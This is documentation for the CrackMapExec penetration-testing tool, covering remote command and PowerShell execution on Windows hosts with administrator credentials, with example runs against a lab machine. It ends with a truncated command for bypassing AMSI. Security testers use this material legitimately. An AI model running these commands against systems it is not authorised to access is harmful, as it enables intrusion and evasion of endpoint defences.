# Remote Command Execution

## Command Execution

Executing commands on a windows system requires Administrator credentials, CME automatically tells you if the credential set you're using has admin access to a host by appending '(Pwn3d!)' to the output when authentication is successful.

See the [Credential](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials) section for details on how to use credentials.

## Execution Methods

CME has three different command execution methods:

* `wmiexec` executes commands via WMI
* `atexec` executes commands by scheduling a task with windows task scheduler
* `smbexec` executes commands by creating and running a service

By default CME will fail over to a different execution method if one fails. It attempts to execute commands in the following order:

1. `wmiexec`
2. `atexec`
3. `smbexec`

If you want to force CME to use only one execution method you can specify which one using the `--exec-method` flag.

## Executing commands

In the following example, we try to execute `whoami` on the target using the `-x` flag:

```
#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
06-05-2016 14:34:35 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
06-05-2016 14:34:35 CME          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
06-05-2016 14:34:39 CME          192.168.10.11:445 WIN7BOX         [+] Executed command 
06-05-2016 14:34:39 CME          192.168.10.11:445 WIN7BOX         lab\administrator
06-05-2016 14:34:39 [*] KTHXBYE!
```

You can also directly execute PowerShell commands using the `-X` flag:

```
#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
06-05-2016 14:36:06 CME          192.168.10.11:445 WIN7BOX         [*] Windows 6.1 Build 7601 (name:WIN7BOX) (domain:LAB)
06-05-2016 14:36:06 CME          192.168.10.11:445 WIN7BOX         [+] LAB\Administrator:P@ssw0rd (Pwn3d!)
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         [+] Executed command 
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         Name                           Value
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         ----                           -----
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         CLRVersion                     2.0.50727.5420
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         BuildVersion                   6.1.7601.17514
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSVersion                      2.0
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         WSManStackVersion              2.0
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSCompatibleVersions           {1.0, 2.0}
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         SerializationVersion           1.1.0.1
06-05-2016 14:36:10 CME          192.168.10.11:445 WIN7BOX         PSRemotingProtocolVersion      2.1
06-05-2016 14:36:10 [*] KTHXBYE!
```

### Bypass AMSI

```
#~ crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypa
```
